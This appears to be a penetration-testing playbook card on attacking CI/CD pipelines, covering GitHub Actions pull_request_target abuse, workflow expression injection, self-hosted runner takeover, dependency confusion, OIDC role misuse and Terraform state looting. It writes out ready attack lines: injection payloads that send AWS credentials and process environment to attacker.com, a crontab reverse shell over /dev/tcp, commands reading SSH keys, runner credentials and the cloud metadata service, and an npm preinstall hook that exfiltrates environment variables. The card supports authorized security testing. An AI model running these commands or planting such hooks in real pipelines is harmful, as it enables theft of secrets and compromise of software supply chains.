# CI/CD And Software Supply-Chain Operations: Attack Primitives: CI/CD Pipeline Attacks

## Contents

- [Attack Primitives: CI/CD Pipeline Attacks](#attack-primitives-cicd-pipeline-attacks)
  - [1. Pull Request Target (GitHub Actions)](#1-pull-request-target-github-actions)
  - [2. Expression Injection (Script Injection) in Workflows](#2-expression-injection-script-injection-in-workflows)
  - [3. Self-Hosted Runner Takeover](#3-self-hosted-runner-takeover)
  - [4. Artifact & Dependency Attacks](#4-artifact-dependency-attacks)
  - [5. OIDC / Cloud Credential Abuse](#5-oidc-cloud-credential-abuse)
  - [6. Infrastructure-as-Code (Terraform / CloudFormation / Pulumi)](#6-infrastructure-as-code-terraform-cloudformation-pulumi)


> Apply [../module-continuity.md](../module-continuity.md). Inherit the engagement, parent path, current capability, evidence, authorization profile, and module stack. Do not initialize a separate workflow. Checkpoint material results and return them to the parent path before leaving this card.

## Attack Primitives: CI/CD Pipeline Attacks

### 1. Pull Request Target (GitHub Actions)

`pull_request_target` is the single most dangerous trigger in GitHub Actions. It runs in the **context of the target repository** (not the fork), with access to **all secrets** of the target repo.

```yaml
# DANGEROUS: This runs with full repo secrets from a fork PR
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.ref }}  # UNTRUSTED CODE
      - run: npm install && npm test  # UNTRUSTED CODE EXECUTES WITH SECRETS
```

**Test**: If you find a workflow using `pull_request_target` + `actions/checkout` with `ref: ${{ github.event.pull_request.head.ref }}`, submit a PR that modifies the workflow or build scripts — your code runs with the repo's secrets.

### 2. Expression Injection (Script Injection) in Workflows

Any workflow that interpolates an attacker-controlled GitHub context value into a `run:` command is injectable:

```yaml
# VULNERABLE: github.event.issue.title is attacker-controlled
- name: Process issue
  run: |
    echo "Issue title: ${{ github.event.issue.title }}"  # INJECTION HERE

# Attacker creates issue with title: "; curl http://attacker.com/$(cat ~/.aws/credentials | base64)"
# Or: "$(curl -X POST -d @/proc/self/environ http://attacker.com/)"
```

**Context values commonly used unsafely**: `github.event.issue.title`, `github.event.issue.body`, `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.comment.body`, `github.event.review.body`, `github.head_ref`, `github.ref`, any `inputs.*` from `workflow_dispatch`.

### 3. Self-Hosted Runner Takeover

Self-hosted runners persist between workflow runs. If you can run a workflow on a self-hosted runner (via PR, or any trigger):

```bash
# The runner process runs your workflow code. You can:
# 1. Access the runner's environment (env vars, filesystem)
cat /home/runner/.env
cat /home/runner/.ssh/id_rsa
cat /etc/environment

# 2. L3 ONLY: persistence is not routine proof. Do not perform without explicit bounded approval.
# Persist a test component only when the engagement specifically requires persistence validation.
echo '*/5 * * * * bash -i >& /dev/tcp/attacker/port 0>&1' | crontab -

# 3. Steal the runner registration token (register your own runner → intercept future jobs)
cat /home/runner/.runner
cat /home/runner/actions-runner/.credentials

# 4. Access cloud metadata if runner is cloud-hosted
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Ephemeral runners** (like GitHub's `runs-on: ubuntu-latest`) are destroyed after the job — harder to persist, but secrets are still accessible during the build.

### 4. Artifact & Dependency Attacks

**Dependency Confusion**:
If an internal package name is known (e.g., `@company/internal-lib`, `company-utils`), and the registry configuration searches public registries first or falls back to public:

```bash
# 1. Discover internal package names from:
#    - package.json / requirements.txt / pom.xml / go.mod in source repos
#    - CI/CD logs that show package installation errors
#    - Lock files (package-lock.json, yarn.lock, Pipfile.lock)

# 2. Publish malicious package with same name to public registry
npm publish  # for npm
# Package should: look normal, but exfiltrate env vars on install
# "scripts": {"preinstall": "curl http://attacker.com/$(env | base64)"}

# 3. Wait for CI/CD build or developer to install it
```

**Artifact Poisoning**:
- Can you upload to an internal package registry? (Artifactory, Nexus, ECR, ACR)
- If yes: overwrite existing package version, upload with higher version, or upload to a different feed that gets pulled
- Build cache poisoning: Can you influence a build cache (npm cache, Maven local, Docker layer cache)?

### 5. OIDC / Cloud Credential Abuse

Modern CI/CD uses OIDC to authenticate to cloud providers without long-lived credentials:

```yaml
# GitHub Actions → AWS via OIDC
- uses: aws-actions/configure-aws-credentials@v2
  with:
    role-to-assume: arn:aws:iam::123456789:role/github-actions-deploy
    aws-region: us-east-1
```

**Test**: Can you run a workflow on a different branch/repo that still assumes this role? The OIDC trust condition typically checks: `token.actions.githubusercontent.com:sub` → `repo:<org>/<repo>:ref:refs/heads/main`. If the trust condition is:
- `repo:<org>/*` → ANY repo in the org can assume the role (overly permissive)
- Missing `ref:` filter → ANY branch (including PR branches) can assume the role
- Missing environment restriction → any workflow can assume, bypassing environment protection rules

### 6. Infrastructure-as-Code (Terraform / CloudFormation / Pulumi)

```bash
# Terraform state files are GOLD
# They contain: ALL resource configurations, outputs, sometimes plaintext secrets
# If you find an S3 bucket with tfstate files:
aws s3 cp s3://<company>-terraform/terraform.tfstate .
cat terraform.tfstate | jq '.resources[] | select(.type == "aws_db_instance") | .instances[].attributes'

# Plan files (terraform plan output) also contain full resource config
# Check CI logs for leaked plan output
```

---


## Card Exit

Classify the result, update evidence and attempted methods, record capability or risk changes, identify affected paths, and apply the return contract in [../module-continuity.md](../module-continuity.md).


